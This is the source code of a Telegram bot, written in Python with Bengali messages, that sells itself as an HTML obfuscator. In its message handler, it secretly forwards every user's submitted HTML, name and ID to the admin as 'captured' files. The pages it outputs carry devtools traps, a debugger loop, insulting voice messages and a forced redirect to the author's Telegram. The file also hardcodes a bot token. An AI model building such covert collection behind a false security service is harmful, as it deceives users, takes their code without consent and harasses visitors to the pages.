import os
import random
import string
from datetime import datetime
from threading import Thread
from flask import Flask
import telebot
from telebot import types

# আপনার বটের টোকেন এবং অ্যাডমিন আইডি
TOKEN = '8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A'
ADMIN_IDS = [8419760844]

# বাধ্যতামূলক টেলিগ্রাম সাপোর্ট গ্রুপ ইউজারনেম
REQUIRED_GROUP = '@SUPPOR8TNIROB'

bot = telebot.TeleBot(TOKEN, parse_mode='Markdown')

# ডেটাবেস স্টোরেজ
banned_users = set()
total_protected_count = 0

# ফ্লাস্ক সার্ভার (Render ফ্রি টায়ারে ২৪ ঘণ্টা সচল রাখার জন্য)
app = Flask('')

@app.route('/')
def home():
    return "NIROB GX Security Bot is running 24/7!"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ইউজার গ্রুপে জয়েন করা আছে কি না তা কঠোরভাবে যাচাই করার ফাংশন
def check_user_membership(user_id):
    if user_id in ADMIN_IDS:
        return True
    try:
        chat_member = bot.get_chat_member(REQUIRED_GROUP, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Membership check error: {e}")
    return False

# ফোর্স জয়েন মেসেজ পাঠানোর ফাংশন
def send_force_join_msg(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 Join Support Group", url="https://t.me/SUPPOR8TNIROB"))
    markup.add(types.InlineKeyboardButton("🔄 Check Membership", callback_data="check_join"))
    bot.send_message(
        chat_id,
        "⚠️ **অ্যাক্সেস ব্লকড!**\n\n"
        "এই বট ব্যবহার করতে হলে আপনাকে অবশ্যই আমাদের অফিশিয়াল সাপোর্ট গ্রুপে জয়েন থাকতে হবে!\n\n"
        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে **'Check Membership'** বাটনে ক্লিক করুন।",
        reply_markup=markup
    )

# সিকিউরিটি হেডার ও হেভি ডেনস অবফাস্কেটর
def obfuscate_html(html_content):
    import base64
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    encoded_bytes = html_content.encode('utf-8')
    encoded_payload = base64.b64encode(encoded_bytes).decode('utf-8')
    
    dense_junk_stream = ""
    for i in range(40):
        line = "var _0x" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + "=["
        for j in range(120):
            hex_val = "0x" + hex(random.randint(0, 65535))[2:]
            line += hex_val + ("," if j < 119 else "")
        line += "];try{if(window._0x_check)throw 'BLOCKED';}catch(e){};"
        dense_junk_stream += line + "\n"

    secured_HTML = f"""<!--
===================================
PROTECTED - DO NOT MODIFY THIS HEADER
------------------------------------------------
Obfuscated By: @NIROB_GX_LEADER
TG: @NIROB_GX_LEADER
Timestamp: {current_time}
Signature: NIROB_GX_PROTECTED_ENGINE
------------------------------------------------
WARNING: Removing or modifying this credit header
will cause this page to stop working!
===================================
-->
<!DOCTYPE html>
<!--=========================================================================================
🔥 MASSIVE DENSE STREAM OBFUSCATION ENGINE ACTIVATED 🔥
=========================================================================================
⚠️ এই তোরা ফালতু চুরি করার চিন্তা বাদ দে!
⚠️ তোর নিরব আব্বার কোডে হাত দিলে হাত-চোখ ভাইঙ্গা হাতে ধরাইয়া দিমু!
⚠️ খাঁটি বাংলা ভাষায় বলে দিলাম— আসল কোড জীবনেও পাইবি না, সোজা তোর নিরব আব্বার কাছে মাফ চা!
=========================================================================================
👑 CREATOR & DEVELOPER  : NIROB (নিরব)
💬 TELEGRAM OFFICIAL   : @NIROB_GX_LEADER
🌐 COMMUNITY           : GX BIG COMMUNITY
=========================================================================================-->
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROTECTED BY NIROB | @NIROB_GX_LEADER</title>
    <style>
        html, body {{
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #000;
        }}
        iframe {{
            width: 100%;
            height: 100%;
            border: none;
        }}
    </style>
</head>
<body oncontextmenu="return false;" onkeydown="return false;">
<script>
    {dense_junk_stream}
    var _0xgx_nirob_payload = "{encoded_payload}";
    var isDestroyed = false;
    
    var telegramTrapLink = "https://t.me/NIROB_GX_LEADER?text=" + encodeURIComponent("নিরব আব্বা আমার ভুল হয়ে গেছে! আমাকে মাফ করে দেন, আপনার এই কোডটা আমার খুব প্রয়োজন...");
    
    function triggerVoiceWarning() {{
        if ('speechSynthesis' in window) {{
            window.speechSynthesis.cancel();
            var msgText = "ওই শয়তানের বাচ্চা! তোর এত্ত বড় সাহস তুই নিরব আব্বার কোডে হাত দেস? ফালতু কোড চুরি করার চিন্তা বাদ দে! আসল কোড জীবনেও পাইবি না! সোজা গিয়া তোর নিরব আব্বার পায়ে ধইরা মাফ চা! টেলিগ্রাম একাউন্ট এট দ্য রেট নিরব জি এক্স লিডার।";
            var speech = new SpeechSynthesisUtterance(msgText);
            speech.lang = 'bn-BD';
            speech.pitch = 1.0;
            speech.rate = 1.0;
            window.speechSynthesis.speak(speech);
        }}
    }}
    
    function destroyAndRedirect() {{
        if (isDestroyed) return;
        isDestroyed = true;
        triggerVoiceWarning();
        document.body.innerHTML = '<div style="background:#000;color:#ff0055;height:100vh;width:100vw;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:sans-serif;padding:20px;"><h1 style="font-size:30px;margin-bottom:15px;text-shadow:0 0 10px #ff0055;">⚠️ ACCESS DENIED BY NIROB ABBA!</h1><p style="font-size:18px;color:#fff;margin-bottom:25px;">তোরা আসল কোড কখনোই পাইবি না! সোজা তোর নিরব আব্বার পায়ে ধরে মাফ চা!</p><a href="' + telegramTrapLink + '" style="background:#00ffcc;color:#000;padding:15px 30px;border-radius:10px;text-decoration:none;font-weight:bold;font-size:20px;box-shadow:0 0 15px #00ffcc;">👉 নিরব আব্বার টেলিগ্রামে যান</a></div>';
        setTimeout(function() {{
            window.location.href = telegramTrapLink;
        }}, 1500);
    }}
    
    (function() {{
        window.addEventListener('keydown', function(e) {{
            if (e.keyCode === 123) {{ e.preventDefault(); e.stopPropagation(); destroyAndRedirect(); return false; }}
            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67 || e.keyCode === 75 || e.keyCode === 69 || e.keyCode === 83)) {{ e.preventDefault(); e.stopPropagation(); destroyAndRedirect(); return false; }}
            if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 80 || e.keyCode === 65)) {{ e.preventDefault(); e.stopPropagation(); destroyAndRedirect(); return false; }}
            if (e.metaKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 73)) {{ e.preventDefault(); e.stopPropagation(); destroyAndRedirect(); return false; }}
        }}, true);
        
        window.addEventListener('contextmenu', function(e) {{ e.preventDefault(); e.stopPropagation(); destroyAndRedirect(); return false; }}, true);
        
        setInterval(function() {{
            var startTime = performance.now();
            (function() {{}}["constructor"]("debugger")());
            var endTime = performance.now();
            if (endTime - startTime > 100) {{ destroyAndRedirect(); }}
        }}, 100);
    }})();
    
    (function(){{
        try {{
            var decoded = decodeURIComponent(escape(atob(_0xgx_nirob_payload)));
            var blob = new Blob([decoded], {{type: 'text/html'}});
            var blobUrl = URL.createObjectURL(blob);
            var iframe = document.createElement('iframe');
            iframe.src = blobUrl;
            document.body.appendChild(iframe);
        }} catch(e) {{
            console.error("CORRUPTION DETECTED. CONTACT @NIROB_GX_LEADER");
        }}
    }})();
</script>
</body>
</html>"""
    return secured_HTML

# কিবোর্ড
def user_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
    return markup

def admin_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('📊 Admin Stats'), types.KeyboardButton('🛠️ Admin Help'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। আনব্যান হতে চাইলে **@NIROB_GX_LEADER** এর সাথে যোগাযোগ করুন।")
        return

    # সাধারণ ইউজার হলে সাপোর্ট গ্রুপ জয়েন চেক করা হবে
    if not check_user_membership(user_id):
        send_force_join_msg(message.chat.id)
        return

    if user_id in ADMIN_IDS:
        admin_welcome = (
            "👑 **WELCOME ADMIN (নিরব ভাই)**\n\n"
            "আপনার সিকিউরিটি বট ফুল্লি লাইভ এবং অ্যাডমিন কন্ট্রোলে আছে!"
        )
        bot.send_message(message.chat.id, admin_welcome, reply_markup=admin_keyboard())
    else:
        welcome_text = (
            "🔒 **HTML OBFUSCATOR BOT**\n\n"
            "📄 Send your **.html** file to start protection!"
        )
        bot.send_message(message.chat.id, welcome_text, reply_markup=user_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    user_id = call.from_user.id
    if user_id in banned_users:
        bot.answer_callback_query(call.id, "❌ আপনি ব্যানপ্রাপ্ত!", show_alert=True)
        return

    if check_user_membership(user_id):
        bot.answer_callback_query(call.id, "✅ জয়েনিং কনফার্ম হয়েছে!")
        bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন। `/start` চাপুন।", reply_markup=user_keyboard())
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি! আগে জয়েন করুন।", show_alert=True)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    admin_text = (
        "👑 **ADMIN PANEL**\n\n"
        f"📊 Protected: `{total_protected_count}`\n"
        f"🚫 Banned: `{len(banned_users)}`\n\n"
        "🛠️ ইউজার ব্যান করতে তার আইডি (যেমন: `123456789`) লিখে পাঠান। আনব্যান করতে `/unban [ID]` দিন।"
    )
    bot.reply_to(message, admin_text, reply_markup=admin_keyboard())

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        if target_id in banned_users:
            banned_users.remove(target_id)
            bot.reply_to(message, f"✅ ইউজার `{target_id}` আনব্যান করা হয়েছে।")
            try:
                bot.send_message(target_id, "✅ আপনাকে আনব্যান করা হয়েছে! এখন বট ব্যবহার করতে পারবেন।")
            except:
                pass
        else:
            bot.reply_to(message, "⚠️ এই ইউজার ব্যান লিস্টে নেই।")
    except Exception:
        bot.reply_to(message, "⚠️ সঠিক নিয়ম: `/unban 123456789`")

@bot.message_handler(content_types=['text', 'document'])
def handle_incoming(message):
    user_id = message.from_user.id
    text = message.text if message.text else ""

    # অ্যাডমিন কোনো ইউজার আইডি পাঠালে তাকে ব্যান করা
    if user_id in ADMIN_IDS and text.isdigit():
        target_id = int(text)
        banned_users.add(target_id)
        bot.reply_to(message, f"✅ ইউজার আইডি `{target_id}` সফলভাবে ব্যান করা হয়েছে!")
        try:
            bot.send_message(target_id, "❌ আপনাকে এই বট থেকে ব্যান করা হয়েছে। যোগাযোগ করুন: **@NIROB_GX_LEADER**")
        except:
            pass
        return

    if user_id in banned_users:
        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। যোগাযোগ করুন: **@NIROB_GX_LEADER**")
        return

    # অ্যাডমিন ব্যতিত সাধারণ ইউজার গ্রুপে না থাকলে কোনো সার্ভিস পাবে না
    if not check_user_membership(user_id):
        send_force_join_msg(message.chat.id)
        return

    if text in ['/start', '/admin', '📊 Admin Stats', '🛠️ Admin Help']:
        if text == '/admin' or text == '📊 Admin Stats':
            admin_panel(message)
        elif text == '🛠️ Admin Help':
            bot.reply_to(message, "🛠️ **সহজ নিয়ম:**\n\nকাককেও ব্যান করতে চাইলে সরাসরি তার **ইউজার আইডি (সংখ্যা)** লিখে পাঠিয়ে দিন। আনব্যান করতে `/unban [ID]` দিন।")
        return

    if text in ['🔒 Obfuscate', '🌐 HTML']:
        bot.send_message(message.chat.id, "📄 আপনার **.html** ফাইল বা কোডটি পাঠান!")
        return

    sent_msg = bot.reply_to(message, "⏳ Processing and applying **Nirob's Dense Stream Security Engine**...")
    
    try:
        html_data = ""
        file_name_original = "unknown.html"
        
        if message.content_type == 'document':
            file_name_original = message.document.file_name or "unknown.html"
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            html_data = downloaded_file.decode('utf-8', errors='ignore')
        else:
            html_data = text

        global total_protected_count
        total_protected_count += 1

        # অ্যাডমিনের কাছে মূল ফাইল ব্যাকআপ পাঠানো
        for admin_id in ADMIN_IDS:
            admin_notification = (
                f"📥 **NEW USER HTML CAPTURED!**\n\n"
                f"👤 **Name:** {message.from_user.first_name}\n"
                f"🆔 **ID:** `{user_id}`\n"
                f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
                f"📁 **File:** `{file_name_original}`"
            )
            bot.send_message(admin_id, admin_notification)
            if len(html_data) < 3000:
                bot.send_message(admin_id, f"📄 **Code:**\n\n```html\n{html_data}\n```")
            else:
                temp_orig = f"Original_{user_id}.html"
                with open(temp_orig, "w", encoding="utf-8") as tf:
                    tf.write(html_data)
                with open(temp_orig, "rb") as tf:
                    bot.send_document(admin_id, tf)
                os.remove(temp_orig)

        secured_code = obfuscate_html(html_data)
        output_file_name = "NIROB_PROTECTED_GX.html"
        
        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(secured_code)
            
        with open(output_file_name, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=(
                    "✅ **আল্ট্রা-ডেনস সিকিউরিটি সফল!**\n\n"
                    "🛡️ **Applied Protections:**\n"
                    "🔹 Heavy Dense Stream Obfuscation\n"
                    "🔹 Blackout Trap & Voice Warning\n"
                    "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
                    "👑 _Protected by @NIROB_GX_LEADER"
                )
            )
        os.remove(output_file_name)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

if __name__ == '__main__':
    keep_alive()
    print("Bot started...")
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
